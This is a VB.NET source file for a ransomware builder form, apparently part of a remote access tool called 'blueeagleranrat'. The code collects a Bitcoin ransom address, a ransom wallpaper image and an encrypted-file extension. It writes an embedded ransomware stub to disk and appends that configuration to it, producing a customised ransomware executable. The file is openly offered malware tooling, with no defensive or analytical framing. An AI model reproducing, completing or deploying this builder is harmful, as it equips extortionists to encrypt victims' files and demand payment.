Imports System.IO

Public Class RasomwareEditor
    Dim path As String = ""
    Dim CurrentPAth As String
    Dim rstub, rtext1, rtext2, rtext3 As String
    Const rspl As String = "abccba"
    Dim rex As Exception

    Private Sub chooseimg()
        Try
            Dim OpenFileDialog1 As New OpenFileDialog
            With OpenFileDialog1
                .CheckFileExists = True
                .ShowReadOnly = False
                .Filter = "All Files|*.*|Bitmap Files (*)|*.bmp;*.gif;*.jpg"
                .FilterIndex = 2
                If .ShowDialog = DialogResult.OK Then

                    PictureBox2.Image = Image.FromFile(.FileName)
                    path = .FileName
                End If
            End With
        Catch ex As Exception
            MsgBox("Exception : " & vbNewLine & ex.Message)
            Exit Sub
        End Try
       
        Label5.Text = path

        CurrentPAth = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        CurrentPAth &= "\"
        PictureBox2.Image.Save(CurrentPAth & "BackBone.jpg", System.Drawing.Imaging.ImageFormat.Jpeg)

        rtext2 = Convert.ToBase64String(IO.File.ReadAllBytes(CurrentPAth & "BackBone.jpg"))
        rtext1 = GhostTextBox4.Text
        rtext3 = GhostTextBox5.Text

    End Sub
    Public Sub HigBuild()
       
        buildRansomware()
    End Sub

    Private Sub RasomwareEditor_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        MsgBox("Use command : use ran -g => Updated Ransomware Editor [Advanced Version]", MsgBoxStyle.Exclamation)
    End Sub

    Private Sub buildRansomware()

        Try
            rtext1 = GhostTextBox4.Text
            Form1.SetAdd(rtext1)
            CurrentPAth = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            CurrentPAth &= "\"
            PictureBox2.Image.Save(CurrentPAth & "BackBone.jpg", System.Drawing.Imaging.ImageFormat.Jpeg)

            rtext2 = Convert.ToBase64String(IO.File.ReadAllBytes(CurrentPAth & "BackBone.jpg"))
            rtext3 = GhostTextBox5.Text
            If rtext1.Length = 0 And rtext2.Length = 0 And rtext3.Length = 0 Then
                MsgBox("Complete Information Please At least Bitcoin Address  & your wallpaper & Extension ", MsgBoxStyle.Critical, "Create Ransomware")


                PictureBox2.Image = Nothing
                Label5.Text = "..."
                GhostTextBox4.Text = "No Bitcoin , No money needed"
                GhostTextBox5.Text = ".blueeagleranrat"
            Else




                Dim temp As String = IO.Path.GetTempPath() & "Ransomware.exe"




                File.WriteAllBytes(temp, My.Resources.nRansomwarex)
                FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                rstub = Space(LOF(1))
                FileGet(1, rstub)
                FileClose(1)
                FileOpen(1, Form1.RanosmwarePath, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, rstub & rspl & rtext1 & rspl & rtext2 & rspl & GhostTextBox5.Text & rspl & Form1.colorx)
                FileClose(1)




            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        'buildRansomware()
        MsgBox("Use command : use ran -g => Updated Ransomware Editor [Advanced Version]", MsgBoxStyle.Exclamation)
        Me.Close()
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        MsgBox("Use command : use ran -g => Updated Ransomware Editor [Advanced Version]", MsgBoxStyle.Exclamation)
    End Sub
End Class